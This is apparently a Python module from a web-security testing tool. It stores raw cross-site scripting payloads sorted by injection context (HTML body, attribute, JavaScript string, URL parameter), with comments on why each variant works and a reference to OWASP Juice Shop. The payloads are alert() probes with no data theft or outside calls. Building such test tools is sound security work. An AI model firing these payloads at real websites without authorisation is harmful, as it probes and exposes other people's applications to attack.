"""
payload_bank.py - Store a baseline list of XSS payloads by context.
All payloads remain raw (not encoded yet), as mutators.py will handle encoding later.
"""

PAYLOADS = {
    # Injected directly into the HTML body (e.g., <div>HERE</div>)
    "html_body": [
        "<script>alert('XSS-test')</script>",  # basic
        "<img src=x onerror=alert('XSS-test')>",  # use img onerror if script tag is blocked
        "<svg onload=alert('XSS-test')>",  # use svg onload
        "<iframe srcdoc=\"<script>alert('XSS-test')</script>\">",
        "<iframe src=\"javascript:alert(`xss`)\">",  # test on OWASP Juice Shop (DOM XSS)
    ],

    # Injected inside an HTML attribute (e.g., <input value="HERE">)
    "attribute": [
        "\"><script>alert('XSS-test')</script>",  # close the tag first before injecting script
        "\" onmouseover=\"alert('XSS-test')",  # add event handler without using angle brackets
        "' onfocus='alert(\"XSS-test\")' autofocus='",  # for attributes using single quotes
        "javascript:alert('XSS-test')",  # for attributes like href or src
    ],

    # Injected inside a JS string (e.g., var user = "HERE";)
    "js_string": [
        "\";alert('XSS-test');//",  # close double quote & comment out remaining code
        "';alert('XSS-test');//",  # close single quote
        "\"+alert('XSS-test')+\"",  # concatenate string using + operator
        "${alert('XSS-test')}",  # for template literals (backticks)
    ],

    # Passed via URL parameter (e.g., /search?q=HERE)
    "url_param": [
        "<script>alert('XSS-test')</script>",  # raw
        "%3Cscript%3Ealert('XSS-test')%3C/script%3E",  # URL encoded
        "%253Cscript%253Ealert('XSS-test')%253C/script%253E",  # double URL encoded
        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS-test')%3E",  # encoded img onerror version
    ],
}


def get_payloads(context: str):
    """Get the payload list for the selected context."""
    if context not in PAYLOADS:
        raise ValueError(f"Unknown context '{context}'. Available: {list(PAYLOADS.keys())}")
    return PAYLOADS[context]


def list_contexts():
    """Return all available context names for CLI usage."""
    return list(PAYLOADS.keys())